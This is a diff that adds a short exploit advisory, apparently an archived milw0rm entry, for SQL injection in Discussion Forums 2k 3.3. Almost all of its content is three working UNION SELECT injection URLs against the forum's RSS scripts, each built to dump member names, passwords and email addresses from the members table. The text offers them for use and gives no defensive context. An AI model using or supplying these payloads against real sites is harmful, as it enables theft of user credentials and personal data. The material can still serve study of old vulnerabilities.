@@ -1,0 +1,21 @@
+Author: ~!Dok_tOR!~
+Date found: 30.09.08
+Product: Discussion Forums 2k
+Version: 3.3
+URL: http://developer.berlios.de/projects/df2k/
+Vulnerability Class: SQL Injection
+Condition: magic_quotes_gpc = Off
+
+Exploit 1:
+
+http://localhost/[installdir]/misc/RSS1.php?CatID=-1)+union+select+concat_ws(0x3a,Name,Password,Email),2,3,4,5,6,7+from+DF2k_Members/*
+
+Exploit 2:
+
+http://localhost/[installdir]/misc/RSS2.php?id=1&CatID=-1)+union+select+concat_ws(0x3a,Name,Password,Email),2,user(),4,5,6,7,8,9,10+from+DF2k_Members/*
+
+Exploit 3:
+
+http://localhost/[installdir]/misc/RSS5.php?SubID=-1)+union+select+concat_ws(0x3a,Name,Password,Email),2,3,4,5+from+DF2k_Members/*
+
+# milw0rm.com [2008-10-01]
